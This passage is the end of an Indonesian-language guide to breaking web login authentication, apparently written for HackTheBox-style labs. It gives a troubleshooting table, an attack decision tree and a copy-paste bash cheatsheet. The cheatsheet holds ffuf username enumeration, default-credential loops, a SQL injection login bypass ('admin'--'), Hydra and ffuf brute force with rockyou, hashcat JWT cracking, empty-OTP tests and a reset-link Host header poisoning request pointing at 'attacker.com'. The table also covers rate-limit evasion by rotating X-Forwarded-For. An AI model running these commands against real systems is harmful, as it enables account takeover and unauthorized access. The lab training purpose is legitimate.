|Hydra mendeteksi hampir semua valid|Failure condition terlalu lemah|Filter dengan `-fs` berdasarkan size, bukan string|
|ffuf semua result valid|Baseline tidak diukur|`curl -s ...|
|CSRF token invalid di brute force|Token dinamis per request|Gunakan Python script yang ambil token tiap request|
|Rate limit setelah N request|Throttling aktif|`X-Forwarded-For` rotation, atau slowdown request|
|Lockout setelah N attempt|Account lockout|Berhenti! Tunggu timeout, atau pindah ke username lain|
|SQLi payload tidak work|Query/context berbeda|Coba variasi quote: `'`, `"`, backtick|
|JWT none algorithm ditolak|Library aman|Lanjut ke weak secret atau algorithm confusion|
|Hashcat JWT tidak menemukan|Secret kuat atau wordlist kurang|Coba SecLists + rules, atau CeWL dari website|
|OTP brute force tidak efektif|Rate limit/lockout ketat|Test empty OTP, response manipulation via Burp|
|Cookie tidak berubah setelah login|Session fixation possible|Report sebagai finding|
|Reset token langsung invalid|One-time token|Test dengan token baru, bandingkan pattern|
|Host header tidak mempengaruhi|App pakai canonical hostname|Cek X-Forwarded-Host dan Forwarded header juga|

**Ketika Benar-Benar Buntu:**

Bash

```
# Google search tips:
# "[platform name] authentication bypass"
# "[platform name] CVE login"
# "[platform name] default credentials"
# "htb [machine name] writeup"  ← jika sudah retired
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Login Page Ditemukan
│
├─ FASE 0: Identifikasi Mechanism
│   ├─ Form-Based   → FASE 1 (Username Enum)
│   ├─ HTTP Basic   → FASE 2 (Default Creds)
│   ├─ JWT          → FASE 5 (JWT Bypass)
│   └─ OAuth/SSO    → FASE 6 (Reset/OAuth)
│
├─ FASE 1: Username Enumeration
│   ├─ Error berbeda → Username valid ditemukan
│   ├─ Timing beda  → Username valid via timing
│   └─ Registration → Username konfirmasi via signup
│
├─ FASE 2: Default Credentials
│   ├─ Berhasil     → FASE 7 (Post-Login)
│   └─ Gagal        → FASE 3
│
├─ FASE 3: SQLi Bypass
│   ├─ Berhasil     → FASE 7 (Post-Login)
│   └─ Gagal        → FASE 4
│
├─ FASE 4: Brute Force
│   ├─ No CSRF      → Hydra / ffuf
│   ├─ Ada CSRF     → Python script
│   ├─ Berhasil     → FASE 7 (Post-Login)
│   └─ Rate limit   → FASE 6 (Password Reset)
│
├─ FASE 5: JWT Bypass
│   ├─ alg=none     → None algorithm attack
│   ├─ HS256        → Hashcat secret brute force
│   └─ RS256        → Algorithm confusion
│
├─ FASE 6: Password Reset / CAPTCHA / MFA
│   ├─ Predictable token → Forge token
│   ├─ Host poisoning    → Intercept reset
│   ├─ CAPTCHA bypass    → Reuse/null/remove
│   └─ MFA bypass        → Brute OTP / response manip
│
└─ FASE 7: Post-Login
    ├─ Session analysis
    ├─ Privilege escalation check
    └─ Credential reuse ke service lain
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="http://10.10.11.200"
export LOGIN_URL="$TARGET/login"
export PARAM_USER="username"; export PARAM_PASS="password"
mkdir -p ~/auth_loot/{recon,creds,tokens}

# === DISCOVERY ===
ffuf -u "$TARGET/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302
curl -s "$LOGIN_URL" | grep -iE "<form|input|csrf|token|hidden"

# === USERNAME ENUM ===
FAIL_SIZE=$(curl -s -X POST "$LOGIN_URL" -d "$PARAM_USER=FAKEFAKE&$PARAM_PASS=x" | wc -c)
ffuf -u "$LOGIN_URL" -X POST -d "$PARAM_USER=FUZZ&$PARAM_PASS=x" \
    -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -fs $FAIL_SIZE

# === DEFAULT CREDS ===
for cred in admin:admin admin:password admin:admin123; do
    r=$(curl -s -X POST "$LOGIN_URL" -d "$PARAM_USER=${cred%:*}&$PARAM_PASS=${cred#*:}" -L)
    echo "$r" | grep -qi "dashboard\|logout" && echo "[+] VALID: $cred"
done

# === SQLi BYPASS ===
curl -s -X POST "$LOGIN_URL" --data-urlencode "$PARAM_USER=admin'--" --data-urlencode "$PARAM_PASS=x" -L | grep -i dashboard

# === BRUTE FORCE ===
hydra -l admin -P /usr/share/wordlists/rockyou.txt "$TARGET" \
    http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -f -t 4

# Ukur fail size untuk ffuf
FAIL=$(curl -s -X POST "$LOGIN_URL" -d "$PARAM_USER=admin&$PARAM_PASS=WRONG999" | wc -c)
ffuf -u "$LOGIN_URL" -X POST -d "$PARAM_USER=admin&$PARAM_PASS=FUZZ" \
    -w /usr/share/wordlists/rockyou.txt -fs $FAIL

# === JWT ===
# Decode
echo "JWT_TOKEN_HERE" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# Crack
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# === PASSWORD RESET ===
curl -s -X POST "$TARGET/forgot-password" -d "email=admin@target.htb"
curl -i -H "X-Forwarded-Host: attacker.com" -X POST "$TARGET/forgot-password" -d "email=admin@target.htb"

# === OTP ===
curl -s -X POST "$TARGET/verify-otp" -b session.txt -d "otp="   # Empty OTP test
curl -s -X POST "$TARGET/send-otp" -b session.txt | jq .        # OTP in response?
```

---

> **➡️ NEXT:** Setelah berhasil bypass authentication dan mendapat akses, jika menemukan form input di dalam aplikasi → lanjut ke **`<a href="/docs/sql-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">19_sql_injection_workflow.md</a>`**. Jika mendapat session admin di CMS → ke workflow CMS yang sesuai. Jika credentials bisa dipakai di service lain, ikuti Cross-Service chart di Fase 7.3.

---